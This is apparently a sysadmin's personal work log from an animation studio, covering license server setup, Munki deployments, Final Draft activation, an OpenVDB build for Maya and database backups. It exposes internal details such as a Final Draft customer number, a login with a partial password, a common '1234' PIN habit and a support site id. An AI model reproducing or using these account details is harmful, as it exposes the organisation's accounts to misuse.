dsiegfriedt@dippertwo:~ $ sudo yum install ~/JOBS/DISNEYTS/GENARTS/GenArtsRLM-11.2.2.0-1.x86_64.rpm

dsiegfriedt@dippertwo:~ $ ps -fe | grep -i rlm
root      51655      1  0 13:35 pts/0    00:00:00 /usr/genarts/rlm/rlm -c /usr/genarts/rlm/genarts.lic -dlog /usr/genarts/rlm/rlm-genarts.log

http://support.genarts.com/Knowledgebase/Article/View/1591/75/how-do-i-set-up-the-genarts-rlm-server-on-my-floating-license-server

@@@ reprise wesit to take care of sapphire RLM license service.
http://dippertwo.disneytoonstudios.com:5054/home.asp

@@@ sapphire license location
dsiegfriedt@dippertwo:~ $ cat /usr/genarts/rlm/genarts.lic

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
as a bandaid... Grace suggested that I install the RPM on Doug's machine (corsair) for him to test.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2


******************************************************************************************************
23Aug17  enable ssh from VCSA

highlight ESXi server
    config tab
      Systems
        Security Profile
	    (Edit) Services
	        Highlight ESXi Shell and click start
		    click OK
	        Highlight SSH and click start
		    click OK
now you can ssh to ESXi server

[root@vsphere-prod-03:~] vi /vmfs/volumes/91500e42-b67ba28e/testleslieprintserver/testleslieprintserver.vmx


******************************************************************************************************
22August17 munki THANK YOU Ree!!!!!

vmmunki.disneytoonstudios.com:8000
   click manifests
     select machine
       edit (manifests    top Right)
         managed Installs "+"
	   start typng name of software to install

@@@ then license it

******************************************************************************************************
22Aug17 FinalDraft licensing

Customer Number: 9FDV-42K7-CKAB-IDTX-3DYX

https://remote.finaldraft.com
  Login: WALT
  Passwd: D...
Approve user
  *****NO SPACES*****
  4 digit random# for pin (lots use 1234)

@@@ this according to Ree
 finaldraft8 we have lots of licenses
   this lic will work on finaldraft9 but only read only

@@@ then from phantom

go to https://remote.finaldraft.com and set up the authization

   paulmcgrath  tumbl  phantom  1234  (will show today's date)

@@@ it will show in "User Managment" that paul's license is ready to be activated

managed update
  there should be an update available for FD9

@@@ there will be some back and fort with the site to insure the correct machine is getting a license (at least with FD8 it did)
 
@@@ email from Greg Neagle 24Aug17

The install on phantom was failing:

--->$ tail /Library/Managed\ Installs/Logs/Install.log 
Aug 23 2017 11:47:39 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1
Aug 23 2017 11:47:58 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1
Aug 23 2017 14:35:34 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1
Aug 23 2017 14:40:26 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1
Aug 23 2017 14:42:55 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1
Aug 23 2017 14:47:56 -0700 Install of Final Draft 9-9.0.8: FAILED with return code: 1

/--->var/log/install.log had unhelpful messages like:

Aug 23 11:47:38 phantom installer[28061]: Product archive /Library/Managed Installs/Cache/Final Draft Installer-9.0.8.pkg trustLevel=3
Aug 23 11:47:57 phantom installer[28118]: Product archive /Library/Managed Installs/Cache/Final Draft Installer-9.0.8.pkg trustLevel=3

On a hunch, I checked to see if the pkg has an expired signature (this can also be observed in the Installer app):

--->bash-3.2$ pkgutil --check-signature /disney/dist/mac/munki_repo/pkgs/apps/Final\ Draft\ Installer-9.0.8.pkg 
Package "Final Draft Installer-9.0.8.pkg":
   Status: signed by a certificate that has since expired
   Certificate Chain:
    1. Developer ID Installer: Final Draft, Inc.
       SHA1 fingerprint: A9 D4 E8 25 64 99 C1 FC E3 E0 5A AC 13 9A 8D 70 85 CD FB 91
       -----------------------------------------------------------------------------
    2. Developer ID Certification Authority
       SHA1 fingerprint: 3B 16 6C 3B 7D C4 B7 51 C9 FE 2A FA B9 13 56 41 E3 88 E1 86
       -----------------------------------------------------------------------------
    3. Apple Root CA
       SHA1 fingerprint: 61 1E 5B 66 2C 59 3A 08 FF 58 D1 4A E2 24 52 D1 98 DF 6C 60

So: you need a newer package from Final Draft, or to upgrade the Munki tools to 3.x, which has special code to allow the install of pkgs with expired signatures.

I imported Final Draft 9.1.0, which does not have an expired package, then re-added FinalDraft9 to phantom's manifest.

--->bash-3.2$ sudo managedsoftwareupdate
Password:
Managed Software Update Tool
Copyright 2010-2016 The Munki Project
https://github.com/munki/munki

Starting...
    Performing preflight tasks...
    preflight stdout: Preflight report submmitted for phantom.
Checking for available updates...
    Retrieving list of software for this machine...
	0..20..40..60..80..100
    Retrieving catalog "production"...
	0..20..40..60..80..100
WARNING: Could not process item Office2011 for install. No pkginfo found in catalogs: production
    Downloading Final Draft Installer-9.1.0.pkg...
	0..20..40..60..80..100
    Verifying package integrity...
    Getting icon AdobePhotoshopCC2015.png for Adobe Photoshop CC 2015...
    Getting icon GoogleEarth.png for Google Earth...
    Getting icon MSLync.png for Lync 14.4.1 Update...
    Getting icon photoshopScripts.png for photoshopScripts-1.0.0.8.15...
    Getting icon Spotify.png for Spotify...
    Getting icon GoogleDrive.png for Google Drive...
    Getting icon Maya2017.png for Autodesk Maya 2017...
    Getting icon Office2016.png for Microsoft Office 2016 for Mac...
    Getting icon FinalDraft9.png for Final Draft 9...
	0..20..40..60..80..100
    Getting client resources...
    Getting client resources...
Checking Apple Software Update catalog...
    Skipping Apple Software Update check because sucatalog is unchanged, installed Apple packages are unchanged and we recently did a full check.
    
    The following items will be installed or upgraded:
        + FinalDraft9-9.1.0
            Screenwriting software

Run managedsoftwareupdate --installonly to install the downloaded updates.
Finishing...
    Performing postflight tasks...
    postflight stdout: Postflight report submmitted for phantom.
Done.
--->bash-3.2$ sudo managedsoftwareupdate --installonly
Managed Software Update Tool
Copyright 2010-2016 The Munki Project
https://github.com/munki/munki

Starting...
    Performing preflight tasks...
    preflight stdout: Preflight report submmitted for phantom.
Installing Final Draft 9 (1 of 1)...
    Preparing for installation…
    Preparing the disk…
    Preparing Final Draft 9…
    Waiting for other installations to complete…
    Configuring the installation…
    50.835204 percent complete...
    Moving items into place…
    Validating packages…
    97.75 percent complete...
    Running installer actions…
    Finishing the Installation…
    100.0 percent complete...
    The software was successfully installed.
Finishing...
    Performing postflight tasks...
    postflight stdout: Postflight report submmitted for phantom.
Done.
So Final Draft 9 is now installed on phantom, though it will probably need to be activated.

((((( see also email from 9/27/16 from Grace )))))


******************************************************************************************************
23Aug17  openVDB

had started working on this with no notes????

dsiegfriedt@dts3329:~ $ ll -rt JOBS/DISNEYTS/MAYA/TEMP/openvdb_maya/
total 470K
-rw-r--r--. 1 dsiegfriedt prodctn  17K Feb  1  2017 LICENSE
-rw-r--r--. 1 dsiegfriedt prodctn 1.4K Feb  1  2017 COPYRIGHT
drwxr-xr-x. 2 dsiegfriedt prodctn  976 Jul 31 11:07 maya
drwxr-xr-x. 3 dsiegfriedt prodctn   70 Aug 21 10:49 ..
-rw-r--r--. 1 dsiegfriedt prodctn  913 Aug 21 11:12 maya_deps
lrwxrwxrwx. 1 dsiegfriedt prodctn    4 Aug 21 11:12 openvdb_maya -> maya
-rw-r--r--. 1 dsiegfriedt prodctn 8.9K Aug 21 15:27 Makefile
drwxr-xr-x. 3 dsiegfriedt prodctn  157 Aug 21 15:27 .

@@@ cp to:
/disney/apps/autodesk/Maya_2017/maya_2017/bin/openvdb_maya/maya

@@@ had to make a buch of links as maya in not installed in a single place and the make file only looks in a single place :^(

ll
total 1028
-rw-r--r--. 1 root root   550 Aug 21 12:57 AEOpenVDBCopyTemplate.mel
-rw-r--r--. 1 root root  1036 Aug 21 12:57 AEOpenVDBFilterTemplate.mel
-rw-r--r--. 1 root root  6262 Aug 21 12:57 AEOpenVDBFromMayaFluidTemplate.mel
-rw-r--r--. 1 root root  6741 Aug 21 12:57 AEOpenVDBFromPolygonsTemplate.mel
-rw-r--r--. 1 root root  3788 Aug 21 12:57 AEOpenVDBReadTemplate.mel
-rw-r--r--. 1 root root  1962 Aug 21 12:57 AEOpenVDBToPolygonsTemplate.mel
-rw-r--r--. 1 root root   585 Aug 21 12:57 AEOpenVDBTransformTemplate.mel
-rw-r--r--. 1 root root  2370 Aug 21 12:57 AEOpenVDBVisualizeTemplate.mel
-rw-r--r--. 1 root root  3830 Aug 21 12:57 AEOpenVDBWriteTemplate.mel
lrwxrwxrwx. 1 root root    35 Aug 21 21:55 MApiVersion.h -> ../../../include/maya/MApiVersion.h
lrwxrwxrwx. 1 root root    40 Aug 21 21:57 MArrayDataHandle.h -> ../../../include/maya/MArrayDataHandle.h
lrwxrwxrwx. 1 root root    34 Aug 21 21:57 MDataBlock.h -> ../../../include/maya/MDataBlock.h
lrwxrwxrwx. 1 root root    35 Aug 21 21:56 MDataHandle.h -> ../../../include/maya/MDataHandle.h
lrwxrwxrwx. 1 root root    34 Aug 21 21:58 MDGContext.h -> ../../../include/maya/MDGContext.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:54 MFnBase.h -> ../../../include/maya/MFnBase.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:56 MFnData.h -> ../../../include/maya/MFnData.h
lrwxrwxrwx. 1 root root    27 Aug 21 21:54 MFn.h -> ../../../include/maya/MFn.h
lrwxrwxrwx. 1 root root    38 Aug 21 21:56 MFnNumericData.h -> ../../../include/maya/MFnNumericData.h
lrwxrwxrwx. 1 root root    33 Aug 21 21:53 MFnPlugin.h -> ../../../include/maya/MFnPlugin.h
lrwxrwxrwx. 1 root root    33 Aug 21 21:58 MIntArray.h -> ../../../include/maya/MIntArray.h
lrwxrwxrwx. 1 root root    36 Aug 21 21:48 MIOStreamFwd.h -> ../../../include/maya/MIOStreamFwd.h
lrwxrwxrwx. 1 root root    33 Aug 21 21:48 MIOStream.h -> ../../../include/maya/MIOStream.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:55 MObject.h -> ../../../include/maya/MObject.h
lrwxrwxrwx. 1 root root    29 Aug 21 21:58 MPlug.h -> ../../../include/maya/MPlug.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:49 MPxData.h -> ../../../include/maya/MPxData.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:55 MPxNode.h -> ../../../include/maya/MPxNode.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:47 MStatus.h -> ../../../include/maya/MStatus.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:45 MString.h -> ../../../include/maya/MString.h
lrwxrwxrwx. 1 root root    31 Aug 21 21:49 MTypeId.h -> ../../../include/maya/MTypeId.h
lrwxrwxrwx. 1 root root    30 Aug 21 21:46 MTypes.h -> ../../../include/maya/MTypes.h
-rw-r--r--. 1 root root  6976 Aug 21 12:57 OpenVDBCopyNode.cc
-rw-r--r--. 1 root root  4667 Aug 21 12:57 OpenVDBData.cc
-rw-r--r--. 1 root root  3846 Aug 21 12:57 OpenVDBData.h
-rw-r--r--. 1 root root  9259 Aug 21 12:57 OpenVDBFilterNode.cc
-rw-r--r--. 1 root root 17880 Aug 21 12:57 OpenVDBFromMayaFluidNode.cc
-rw-r--r--. 1 root root 17477 Aug 21 12:57 OpenVDBFromPolygonsNode.cc
-rw-r--r--. 1 root root  5818 Aug 21 12:57 OpenVDBPlugin.cc
-rw-r--r--. 1 root root  2663 Aug 21 13:41 OpenVDBPlugin.h
-rw-r--r--. 1 root root  7504 Aug 21 12:57 OpenVDBReaadnode.cc
-rw-r--r--. 1 root root 13559 Aug 21 12:57 OpenVDBToPolygonsNode.cc
-rw-r--r--. 1 root root  9914 Aug 21 12:57 OpenVDBTransformNode.cc
-rw-r--r--. 1 root root 20254 Aug 21 12:57 OpenVDBUtil.cc
-rw-r--r--. 1 root root 33217 Aug 21 12:57 OpenVDBUtil.h
-rw-r--r--. 1 root root 19836 Aug 21 12:57 OpenVDBVisualizeNode.cc
-rw-r--r--. 1 root root  9300 Aug 21 12:57 OpenVDBWriteNode.cc

[root@dts3329 openvdb_maya]# pwd
/disney/apps/autodesk/Maya_2017/maya_2017/bin/openvdb_maya
[root@dts3329 openvdb_maya]# make
Makefile:54: Warning: $(MAYA_LOCATION) is not set
Building maya/OpenVDBCopyNode.o because of OpenVDBCopyNode.cc and others
g++ -c -std=c++11 -pthread -O3 -DNDEBUG -I . -I /tmp/OpenVDB/include -isystem  -isystem  -isystem /include -isystem /include  -D_BOOL -DFUNCPROTO -DGL_GLEXT_PROTOTYPES=1 -DREQUIRE_IOSTREAM -DUNIX -fno-gnu-keywords -fno-omit-frame-pointer -fno-strict-aliasing -funsigned-char -Wno-comment -Wno-multichar -Wno-strict-aliasing  -m64 -DBits64_ -DLINUX -DLINUX_64 -fPIC -o maya/OpenVDBCopyNode.o maya/OpenVDBCopyNode.cc
In file included from maya/OpenVDBCopyNode.cc:34:0:
./openvdb_maya/OpenVDBData.h:39:30: fatal error: openvdb/Platform.h: No such file or directory
 #include <openvdb/Platform.h>
                              ^
compilation terminated.
make: *** [maya/OpenVDBCopyNode.o] Error 1
[root@dts3329 openvdb_maya]# 

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++ WRONG ++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

need to download (unzip) openvdb_4_0_2_library.zip
yum install boost-devel

[root@dts3329 openvdb]# pwd
/disney/home/dsiegfriedt/JOBS/DISNEYTS/MAYA/TEMP/openvdb


[root@dts3329 openvdb]# make
Building Grid.o because of Grid.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o Grid.o Grid.cc
In file included from Metadata.h:35:0,
                 from MetaMap.h:34,
                 from Grid.h:35,
                 from Grid.cc:31:
Types.h:36:26: fatal error: OpenEXR/half.h: No such file or directory
 #include <OpenEXR/half.h>
                          ^
compilation terminated.
make: *** [Grid.o] Error 1
[root@dts3329 openvdb]# pwd
/disney/apps/autodesk/Maya_2017/maya_2017/openVDB/openvdb
[root@dts3329 openvdb]# 

nope..... asking for help from the software folks (via Calin)

Amy foolishly volenteered .... sent email with what I had found

yum install
    openexr-devel
    log4cplus
    log4cplus-devel
    tbb-devel


[root@dts3329 openvdb]# make
Building Grid.o because of Grid.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o Grid.o Grid.cc
Building io/Archive.o because of Archive.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/Archive.o io/Archive.cc
Building io/Compression.o because of Compression.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/Compression.o io/Compression.cc
Building io/File.o because of File.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/File.o io/File.cc
Building io/GridDescriptor.o because of GridDescriptor.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/GridDescriptor.o io/GridDescriptor.cc
Building io/Queue.o because of Queue.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/Queue.o io/Queue.cc
Building io/Stream.o because of Stream.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/Stream.o io/Stream.cc
Building io/TempFile.o because of TempFile.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o io/TempFile.o io/TempFile.cc
Building math/Maps.o because of Maps.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o math/Maps.o math/Maps.cc
Building math/Proximity.o because of Proximity.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o math/Proximity.o math/Proximity.cc
Building math/QuantizedUnitVec.o because of QuantizedUnitVec.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o math/QuantizedUnitVec.o math/QuantizedUnitVec.cc
Building math/Transform.o because of Transform.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o math/Transform.o math/Transform.cc
Building Metadata.o because of Metadata.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o Metadata.o Metadata.cc
Building MetaMap.o because of MetaMap.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o MetaMap.o MetaMap.cc
Building openvdb.o because of openvdb.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o openvdb.o openvdb.cc
Building Platform.o because of Platform.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o Platform.o Platform.cc
Building points/AttributeArray.o because of AttributeArray.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/AttributeArray.o points/AttributeArray.cc
Building points/AttributeArrayString.o because of AttributeArrayString.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/AttributeArrayString.o points/AttributeArrayString.cc
Building points/AttributeGroup.o because of AttributeGroup.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/AttributeGroup.o points/AttributeGroup.cc
Building points/AttributeSet.o because of AttributeSet.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/AttributeSet.o points/AttributeSet.cc
Building points/points.o because of points.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/points.o points/points.cc
Building points/StreamCompression.o because of StreamCompression.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o points/StreamCompression.o points/StreamCompression.cc
Building util/Formats.o because of Formats.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o util/Formats.o util/Formats.cc
Building util/Util.o because of Util.cc
g++ -c -DOPENVDB_PRIVATE -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -fPIC -o util/Util.o util/Util.cc
Building libopenvdb.so.4.0.2 because of Grid.o and others
g++ -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -shared -o libopenvdb.so.4.0.2 Grid.o io/Archive.o io/Compression.o io/File.o io/GridDescriptor.o io/Queue.o io/Stream.o io/TempFile.o math/Maps.o math/Proximity.o math/QuantizedUnitVec.o math/Transform.o Metadata.o MetaMap.o openvdb.o Platform.o points/AttributeArray.o points/AttributeArrayString.o points/AttributeGroup.o points/AttributeSet.o points/points.o points/StreamCompression.o util/Formats.o util/Util.o -ldl -lm -lz -Wl,-rpath, -L -lHalf -Wl,-rpath, -L -ltbb -Wl,-rpath, -L -lboost_iostreams -lboost_system  -Wl,-rpath,/rel/folio/log4cplus/log4cplus-1.1.2-latest/library/c++11 -L/rel/folio/log4cplus/log4cplus-1.1.2-latest/library/c++11 -llog4cplus -lrt -Wl,-soname,libopenvdb.so.4.0
ln -f -s libopenvdb.so.4.0.2 libopenvdb.so
ln -f -s libopenvdb.so.4.0.2 libopenvdb.so.4.0
Building python/pyFloatGrid.o because of pyFloatGrid.cc and others
g++ -c -std=c++11 -pthread -O3 -DNDEBUG -I . -I .. -isystem /include -isystem /include -isystem /include -isystem /rel/folio/log4cplus/log4cplus-1.1.2-latest/sys_include -DOPENVDB_USE_LOG4CPLUS -DOPENVDB_USE_GLFW_3 -I . -fPIC -isystem python -isystem /python/include/python2.7 -isystem /python/include/python2.7 -isystem /rel/lang/python/2.7.9-1/lib/python2.7/site-packages/numpy/core/include/numpy/ -DPY_OPENVDB_USE_NUMPY -o python/pyFloatGrid.o python/pyFloatGrid.cc
In file included from /usr/include/boost/python/detail/prefix.hpp:13:0,
                 from /usr/include/boost/python/args.hpp:8,
                 from /usr/include/boost/python.hpp:11,
                 from python/pyGrid.h:39,
                 from python/pyFloatGrid.cc:35:
/usr/include/boost/python/detail/wrap_python.hpp:50:23: fatal error: pyconfig.h: No such file or directory
 # include <pyconfig.h>
                       ^
compilation terminated.
make: *** [python/pyFloatGrid.o] Error 1


24Aug17 the contiuation of openvdb

Amy is trying it now......  we will wait and see

@@@ From Amy's email 25Aug17
My Notes:

Source code here:
/disney/apps/autodesk/Maya_2017/maya_2017/openVDB/openvdb

Build commands:
$ ssh dts3329
$ sudo su -
$ cd /disney/apps/autodesk/Maya_2017/maya_2017/openVDB/openvdb
$ make clean
$ make

Found some notes in Makefile:
# Note that if you plan to build the Houdini OpenVDB tools (distributed
# separately), you must build the OpenVDB library and the Houdini tools
# against compatible versions of the Boost, OpenEXR and TBB libraries.
# Fortunately, all three are included in the Houdini HDK, so the relevant
# variables below point by default to the HDK library and header directories:
# $(HDSO) and $(HT)/include, respectively. (Source the houdini_setup script
# to set those two environment variables.)

Find Houdini setup script:
$ pushd /disney/apps/sidefx/hfs16.0.671/
$ source houdini_setup
The Houdini 16.0.671 environment has been initialized.

Now we have the environment variables we need to build:
$ env | grep HT
HT=/disney/apps/sidefx/hfs16.0.671/toolkit
$ env | grep HDSO
HDSO=/disney/apps/sidefx/hfs16.0.671/dsolib
$ env | grep HFS
HFS=/disney/apps/sidefx/hfs16.0.671

Variables changed in Makefile:
NUMPY_INCL_DIR
CPPUNIT_INCL_DIR
CPPUNIT_LIB_DIR

Additional packages installed:
cppunit-devel

******************************************************************************************************
23Aug17  zabbix monitoring http on shotgun (crophopper)

@@@ locally on crophopper
[root@crophopper ~]# zabbix_agent -t proc.num[httpd]
proc.num[httpd]                               [u|13]

https://www.zabbix.com/documentation/3.4/manual/web_monitoring?s[]=http

******************************************************************************************************
5Sep17  data collection for isilon ticket

isi_gather_info
https://onlinesupport.emc.com/SRCreate

emc site id = 16419467

******************************************************************************************************
5Sep17 download maya 2018

https://manage.autodesk.com/cep/#products-services/all?sort=%5B%7B%22field%22%3A%22displayName.raw%22%2C%22order%22%3A%22asc%22%7D%2C%7B%22field%22%3A%22accessType%22%2C%22order%22%3A%22asc%22%7D%5D&start=0&rows=100
login
select download icon in the Maya row
select (version) 2018
select (platform) linux 64
select (Language) English

mv from Download to ~/JOBS/DISNEYTS/MAYA/

untar

sudo mkdir /disney/apps/autodesk/Maya_20??

mkdir /disney/home/dsiegfriedt/JOBS/DISNEYTS/MAYA/Maya_20??

mv ~/Download/Maya20??_64-2018.0-5870.x86_64.rpm  /disney/home/dsiegfriedt/JOBS/DISNEYTS/MAYA/Maya_20??
******************************************************************************************************
10sep17  backup shotgun via command line
email from Grace 10Sep17

Hi Kadie, 

I ran the backups manually using the following commands: 

[postgres@windlifter ~]$ /DB/pgsql/9.3/bin/pg_dump -U postgres com_disney_shotgun_toon > "/DB/backup/full/com_disney_shotgun_toon_`date '+\%F-\%H\%M'`.sql"

[postgres@windlifter ~]$ /DB/pgsql/9.3/bin/pg_dump -U postgres --schema-only com_disney_shotgun_toon > "/DB/backup/full/com_disney_shotgun_toon_`date '+\%F-\%H\%M'`.DDL.sql"

And the backups ran for a whopping 2 minutes. We don't have a lot of content yet, DB is only 8GB, so backups ran quick. 


******************************************************************************************************
15Sep17  adding space to chug II
plugged in all 4 drives
dmesg shows
{SNIP}
[12329477.115757] hpsa 0000:03:00.0: scsi 0:0:5:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329507.199807] hpsa 0000:03:00.0: scsi 0:0:6:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329507.199812] hpsa 0000:03:00.0: scsi 0:0:7:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329537.283710] hpsa 0000:03:00.0: scsi 0:0:8:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[root@chug ~]#

[root@chug ~]# ll /dev/disk/by-path/
total 0
lrwxrwxrwx 1 root root  9 Sep 15 01:30 pci-0000:03:00.0-scsi-0:1:0:0 -> ../../sda
lrwxrwxrwx 1 root root 10 Sep 15 01:30 pci-0000:03:00.0-scsi-0:1:0:0-part1 -> ../../sda1
